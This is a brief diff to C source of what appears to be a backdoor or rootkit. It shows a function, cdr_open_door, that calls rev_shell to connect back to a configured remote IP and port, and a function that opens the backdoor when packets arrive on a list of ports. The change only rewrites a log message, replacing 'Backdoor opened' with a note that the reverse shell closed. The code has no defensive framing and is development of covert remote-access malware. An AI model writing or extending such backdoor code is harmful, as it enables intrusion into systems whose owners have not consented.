@@ -204,8 +204,8 @@ void cdr_open_door(void) {
     uint16_t rev_port = REVERSE_PORT;
     unsigned int seconds = DELAY_TIME;
     rev_shell(rev_ip, rev_port, seconds);
+    LOG("Reverse shell on %s:%u closed\n", rev_ip, rev_port);
 #endif
-    LOG("Backdoor opened\n");
 }
 
 void open_backdoor_via_port_list(unsigned int cports[], int cportcnt, int *actport, struct tcphdr *tcp) {
